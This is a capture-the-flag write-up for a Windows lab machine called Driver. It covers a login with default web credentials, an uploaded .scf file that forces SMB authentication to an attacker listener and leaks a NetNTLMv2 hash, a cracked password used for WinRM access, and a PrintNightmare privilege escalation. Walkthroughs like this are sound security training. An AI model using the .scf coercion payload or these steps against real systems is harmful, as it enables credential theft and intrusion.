# Driver

**Difficulty:** Easy | **OS:** Windows | **IP:** `10.129.95.238`

## Summary
**Driver** is an easy-difficulty Windows machine that highlights default web credentials, NTLM forced authentication attacks, and unpatched internal system services. Initial access is achieved by logging into a web administration portal using default credentials (`admin`:`admin`) and uploading a Shell Command File (`.scf`) to coerce SMB authentication from an active user session. This yields a NetNTLMv2 hash for user `tony`, which is cracked offline and used to authenticate via WinRM. Privilege escalation to `NT AUTHORITY\SYSTEM` is completed by identifying an unpatched Windows Print Spooler service and exploiting the PrintNightmare vulnerability (CVE-2021-34527).

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating open TCP ports and active service versions:

- **80**: HTTP (Microsoft IIS httpd 10.0)
- **135**: MSRPC (Microsoft Windows RPC)
- **445**: SMB (Microsoft-DS (Workgroup: WORKGROUP))
- **5985**: WinRM (Microsoft HTTPAPI httpd 2.0 (WS-Management))

### Web Enumeration & Authentication
Navigating to the web server on port 80 presents a login portal requesting administrative credentials:

1) Testing common default credentials allows entry using `admin` : `admin`.
2) The authenticated portal includes a file/driver upload interface intended for system updates.

## Exploitation (Initial Access)

### Forced SMB Authentication (SCF Coercion)
Windows Explorer automatically attempts to retrieve and preview icon files when browsing folders containing Shell Command Files (`.scf`). If the file specifies a remote UNC path (e.g., `\\10.10.14.28\share\icon.ico`), Windows initiates an outbound SMB connection and transmits the current user's NetNTLMv2 authentication hash.

1) We set up an SMB authentication listener (`impacket-smbserver`) on our attack host (`10.10.14.28`).
2) We upload a crafted `.scf` file via the web upload panel pointing to our listener:

```
[Shell]
Command=2
IconFile=\\10.10.14.28\smbserver\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

3) An active background user process (`tony`) attempts to process the uploaded file, triggering an SMB authentication request to our listener and exposing the NetNTLMv2 hash.

### Hash Cracking & WinRM Access
Cracking the captured NetNTLMv2 hash for user `tony` offline using standard wordlists yields the cleartext password:

Recovered Credentials: `tony` : `liltony`

With WinRM (Port 5985) open, we authenticate to the machine using `evil-winrm`:

```evil-winrm -i 10.129.95.238 -u tony -p liltony```

We gain interactive shell access as tony and retrieve `user.txt`.

## Privilege Escalation (Root Flag)

### Local Enumeration & Service Discovery
Running system enumeration scripts (such as `winPEAS`) identifies active listening processes and system services:

```TCP   0.0.0.0:49410   0.0.0.0:0   LISTENING   1104   spoolsv```

**Key Finding**: Process ID `1104` belongs to `spoolsv.exe`, the Windows Print Spooler service.

### Print Spooler Analysis (PrintNightmare - CVE-2021-34527)
The Windows Print Spooler service (`spoolsv.exe`) in unpatched releases contains a critical privilege escalation vulnerability known as PrintNightmare.

1) **Vulnerability Mechanism:** The `RpcAddPrinterDriverEx()` API fails to properly restrict privileges when adding custom printer drivers. Authenticated users can remotely or locally pass arbitrary driver libraries (`.dll`) to the Print Spooler.
2) **Impact:** Since `spoolsv.exe` operates under the elevated context of `NT AUTHORITY\SYSTEM`, executing a malicious driver allows the creation of a new administrative user or arbitrary command execution as `SYSTEM`.

Exploiting PrintNightmare against the target service grants full administrative access to the host, enabling retrieval of `root.txt`.
